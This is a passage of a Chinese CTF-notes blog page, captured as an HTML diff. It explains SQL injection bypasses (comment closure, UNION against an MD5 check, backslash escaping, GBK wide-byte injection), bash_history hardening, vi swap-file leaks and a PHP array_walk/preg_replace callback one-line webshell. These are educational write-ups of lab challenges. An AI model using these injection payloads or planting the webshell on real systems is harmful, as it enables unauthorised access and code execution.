+<th>注释方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>#</td>
+<td>注释到行尾</td>
+</tr>
+<tr>
+<td>/*内容*/</td>
+<td>用于行间或多行注释（也可用/**/代替空格）</td>
+</tr>
+<tr>
+<td>–</td>
+<td>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1–    ）</td>
+</tr>
+</tbody>
+</table>
+<p>解法：本题可post：<br><code>user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123</code></p>
+<p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code></p>
+<p>查询语句就能成功返回user列，值为admin的那条记录。</p>
+<h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有<code>$query[pw]</code>的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。</p>
+<p>例如：<code>select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;</code>这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。</p>
+<p>注意别忘记输入pass后，会对其进行MD5加密。所以构造post：<code>user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir</code>查询语句就变为<code>SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;;</code></p>
+<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造<code>username=suqir\&amp;password=or%201%23</code><br>使得查询语句如下</p>
+<p><code>SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39;</code></p>
+<p>即</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> </span><br><span class="line"><span class="keyword">name</span>=<span class="string">'suqir\' AND pass='</span>            『 [<span class="keyword">name</span>]的值为 [<span class="string">' AND pass=]  ，显然逻辑值为false 』</span></span><br><span class="line"><span class="string">or 1                                『 但没关系，[false or 1] 的逻辑值为真』 </span></span><br><span class="line"><span class="string">#'</span>                                  『 注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="literal">false</span> <span class="keyword">or</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>一道综合题:<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">南邮CTF-综合题2</a>及其<a href="https://a2chitect.cn/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/" target="_blank" rel="noopener">writeup</a></p>
+<h2 id="GBK宽字节编码漏洞-gbk-sql-injection"><a href="#GBK宽字节编码漏洞-gbk-sql-injection" class="headerlink" title="GBK宽字节编码漏洞(gbk_sql_injection)"></a>GBK宽字节编码漏洞(gbk_sql_injection)</h2><p>介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞<br>正常情况下 magic_quote_gpc 为ON,如果输入</p>
+<p><code>http://www.xxxx.com/index.php?user=11′ and 1=2 #</code></p>
+<p>SQL语句就会变成</p>
+<p><code>SELECT * FROM user WHERE user=’1\’ and 1=2 #’</code></p>
+<p>自动加上了\转义，如果构造特殊的宽字节编码呢？</p>
+<p><code>http://www.xxxx.com/index.php?user=11%df%27 and 1=2 #</code></p>
+<p>SQL语句就变成</p>
+<p><code>SELECT * FROM user WHERE user=’11運’ and 1=2#’</code></p>
+<p>这样就注入上了！</p>
+<p><code>11%df</code>会被解析成<code>11運</code>,而<code>%27</code>被邪恶的解析成<code>&#39;</code>就绕过了gpc转义,就成功构造注入了</p>
+<h1 id="Unix-Linux相关"><a href="#Unix-Linux相关" class="headerlink" title="Unix/Linux相关"></a>Unix/Linux相关</h1><h2 id="bash-history"><a href="#bash-history" class="headerlink" title="bash_history"></a>bash_history</h2><p>Bash shell在<code>~/.bash_history</code>（<code>~/</code>表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个<code>.bash_history</code>文件。</p>
+<p>为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。</p>
+<p>删除方法: 第一步：<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行确定所有用户的<code>.bash_history</code>文件中可以保存的旧命令条数。强烈建议把把<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行的值设为一个较小的数，比如30。编辑profile文件<code>vi /etc/profile</code>，把下面这行改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HISTFILESIZE=30</span><br><span class="line">HISTSIZE=30</span><br></pre></td></tr></table></figure>
+<p>这表示每个用户的<code>.bash_history</code>文件只可以保存30条旧命令。</p>
+<p>第二步：网管还应该在<code>/etc/skel/.bash_logout</code>文件中添加下面这行<code>rm -f $HOME/.bash_history</code>。这样，当用户每次注销时<code>.bash_history</code>文件都会被删除. </p>
+<h2 id="vi编辑器的备份文件"><a href="#vi编辑器的备份文件" class="headerlink" title="vi编辑器的备份文件"></a>vi编辑器的备份文件</h2><p>linux下一般使用vi编辑器，并且异常退出会留下备份文件<code>xxx.swp</code></p>
+<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="数组回调后门"><a href="#数组回调后门" class="headerlink" title="数组回调后门"></a>数组回调后门</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：利用了php中回调函数的后门，可以使<code>www</code>为<code>preg_replace</code>函数，当<code>array_walk()</code>将函数作用于数组时，POST传入的数据作为<code>preg_replace()</code>的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。</p>
+<p>测试：<br><img src="/2018/10/12/CTF/hdhs.png" alt="image"></p>
+<p><strong>未完待续。。。</strong></p>
+
+    </div>
+
+    
+    
+    
+      
+
+        <div class="reward-container">
+  <div>您的支持将鼓励我的创作！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="苏乞儿 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="苏乞儿 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2018/10/29/记一次CTF大赛的感受/" rel="next" title="记一次CTF大赛的感受">
+      记一次CTF大赛的感受 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
     let { activeClass } = CONFIG.comments;
     if (CONFIG.comments.storage) {
       activeClass = localStorage.getItem('comments_active') || activeClass;
@@ -16,7 +572,205 @@
       let commentClass = event.target.classList[1];
       localStorage.setItem('comments_active', commentClass);
     });
-  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#直接查看源码"><span class="nav-number">1.</span> <span class="nav-text">直接查看源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修改maxlength"><span class="nav-number">2.</span> <span class="nav-text">修改maxlength</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IP伪造"><span class="nav-number">3.</span> <span class="nav-text">IP伪造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进制转换"><span class="nav-number">4.</span> <span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP弱类型"><span class="nav-number">5.</span> <span class="nav-text">PHP弱类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#类型一"><span class="nav-number">5.1.</span> <span class="nav-text">类型一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#类型二"><span class="nav-number">5.2.</span> <span class="nav-text">类型二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脑洞题"><span class="nav-number">6.</span> <span class="nav-text">脑洞题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jjencode-aaencode（颜文字）"><span class="nav-number">7.</span> <span class="nav-text">jjencode/aaencode（颜文字）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">8.</span> <span class="nav-text">文件包含漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql"><span class="nav-number">9.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#robots-txt"><span class="nav-number">10.</span> <span class="nav-text">robots.txt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#00"><span class="nav-number">11.</span> <span class="nav-text">%00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量覆盖"><span class="nav-number">12.</span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#上传绕过"><span class="nav-number">13.</span> <span class="nav-text">上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00截断"><span class="nav-number">13.1.</span> <span class="nav-text">0x00截断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">14.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常规注入"><span class="nav-number">14.1.</span> <span class="nav-text">常规注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#正常闭合"><span class="nav-number">14.1.1.</span> <span class="nav-text">正常闭合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union查询"><span class="nav-number">14.1.2.</span> <span class="nav-text">union查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#转义"><span class="nav-number">14.1.3.</span> <span class="nav-text">转义</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GBK宽字节编码漏洞-gbk-sql-injection"><span class="nav-number">14.2.</span> <span class="nav-text">GBK宽字节编码漏洞(gbk_sql_injection)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unix-Linux相关"><span class="nav-number">15.</span> <span class="nav-text">Unix/Linux相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-history"><span class="nav-number">15.1.</span> <span class="nav-text">bash_history</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vi编辑器的备份文件"><span class="nav-number">15.2.</span> <span class="nav-text">vi编辑器的备份文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一句话木马"><span class="nav-number">16.</span> <span class="nav-text">一句话木马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#数组回调后门"><span class="nav-number">16.1.</span> <span class="nav-text">数组回调后门</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="苏乞儿" src="http://q.qlogo.cn/headimg_dl?dst_uin=977265215&spec=100"><p class="site-author-name" itemprop="name">苏乞儿</p><div class="site-description" itemprop="description">分享一切好玩的事情！</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">12</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/suqir" title="GitHub → https://github.com/suqir" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a href="https://www.jianshu.com/u/d9abfae2e52a" title="简书 → https://www.jianshu.com/u/d9abfae2e52a" rel="noopener" target="_blank"><i class="fa fa-fw fa-book"></i> 简书</a></span><span class="links-of-author-item"><a href="mailto:977265215@qq.com" title="邮箱 → mailto:977265215@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i> 邮箱</a></span><span class="links-of-author-item"><a href="https://weibo.com/6462953618" title="微博 → https://weibo.com/6462953618" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i> 微博</a></span></div><div class="links-of-blogroll motion-element"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> 友情链接</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="http://suqir.xyz/" title="http://suqir.xyz/" rel="noopener" target="_blank">苏乞儿</a></li><li class="links-of-blogroll-item"><a href="http://qbce1999.club/" title="http://qbce1999.club/" rel="noopener" target="_blank">孤独的√3</a></li><li class="links-of-blogroll-item"><a href="http://lxlstudent.me/" title="http://lxlstudent.me/" rel="noopener" target="_blank">课本里的小亮</a></li><li class="links-of-blogroll-item"><a href="http://wk.suqir.xyz/" title="http://wk.suqir.xyz/" rel="noopener" target="_blank">网课宝</a></li></ul></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="beian"><a href="http://www.beian.miit.gov.cn" rel="noopener" target="_blank">蜀ICP备20004417号</a> <img src="/images/gongan.png" style="display:inline-block"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51132402000068" rel="noopener" target="_blank">川公网安备 51132402000068号</a></div><div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span><span class="with-love"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">苏乞儿</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span class="post-meta-item-text">站点总字数：</span> <span title="站点总字数">232k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span class="post-meta-item-text">站点阅读时长 &asymp;</span> <span title="站点阅读时长">3:31</span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i></span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span></span></span> <span class="post-meta-divider">|</span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css"><script>NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#直接查看源码"><span class="nav-number">1.</span> <span class="nav-text">直接查看源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修改maxlength"><span class="nav-number">2.</span> <span class="nav-text">修改maxlength</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IP伪造"><span class="nav-number">3.</span> <span class="nav-text">IP伪造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进制转换"><span class="nav-number">4.</span> <span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP弱类型"><span class="nav-number">5.</span> <span class="nav-text">PHP弱类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#类型一"><span class="nav-number">5.1.</span> <span class="nav-text">类型一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#类型二"><span class="nav-number">5.2.</span> <span class="nav-text">类型二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脑洞题"><span class="nav-number">6.</span> <span class="nav-text">脑洞题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jjencode-aaencode（颜文字）"><span class="nav-number">7.</span> <span class="nav-text">jjencode/aaencode（颜文字）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">8.</span> <span class="nav-text">文件包含漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql"><span class="nav-number">9.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#robots-txt"><span class="nav-number">10.</span> <span class="nav-text">robots.txt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#00"><span class="nav-number">11.</span> <span class="nav-text">%00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量覆盖"><span class="nav-number">12.</span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#上传绕过"><span class="nav-number">13.</span> <span class="nav-text">上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00截断"><span class="nav-number">13.1.</span> <span class="nav-text">0x00截断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">14.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常规注入"><span class="nav-number">14.1.</span> <span class="nav-text">常规注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#正常闭合"><span class="nav-number">14.1.1.</span> <span class="nav-text">正常闭合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union查询"><span class="nav-number">14.1.2.</span> <span class="nav-text">union查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#转义"><span class="nav-number">14.1.3.</span> <span class="nav-text">转义</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GBK宽字节编码漏洞-gbk-sql-injection"><span class="nav-number">14.2.</span> <span class="nav-text">GBK宽字节编码漏洞(gbk_sql_injection)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unix-Linux相关"><span class="nav-number">15.</span> <span class="nav-text">Unix/Linux相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-history"><span class="nav-number">15.1.</span> <span class="nav-text">bash_history</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vi编辑器的备份文件"><span class="nav-number">15.2.</span> <span class="nav-text">vi编辑器的备份文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一句话木马"><span class="nav-number">16.</span> <span class="nav-text">一句话木马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#数组回调后门"><span class="nav-number">16.1.</span> <span class="nav-text">数组回调后门</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="苏乞儿"
+      src="http://q.qlogo.cn/headimg_dl?dst_uin=977265215&spec=100">
+  <p class="site-author-name" itemprop="name">苏乞儿</p>
+  <div class="site-description" itemprop="description">分享一切好玩的事情！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/suqir" title="GitHub → https://github.com/suqir" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/d9abfae2e52a" title="简书 → https://www.jianshu.com/u/d9abfae2e52a" rel="noopener" target="_blank"><i class="fa fa-fw fa-book"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:977265215@qq.com" title="邮箱 → mailto:977265215@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>邮箱</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/6462953618" title="微博 → https://weibo.com/6462953618" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://suqir.xyz/" title="http://suqir.xyz/" rel="noopener" target="_blank">苏乞儿</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://qbce1999.club/" title="http://qbce1999.club/" rel="noopener" target="_blank">孤独的√3</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://lxlstudent.me/" title="http://lxlstudent.me/" rel="noopener" target="_blank">课本里的小亮</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://wk.suqir.xyz/" title="http://wk.suqir.xyz/" rel="noopener" target="_blank">网课宝</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn" rel="noopener" target="_blank">蜀ICP备20004417号 </a>
+      <img src="/images/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51132402000068" rel="noopener" target="_blank">川公网安备 51132402000068号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">苏乞儿</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">224k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:24</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
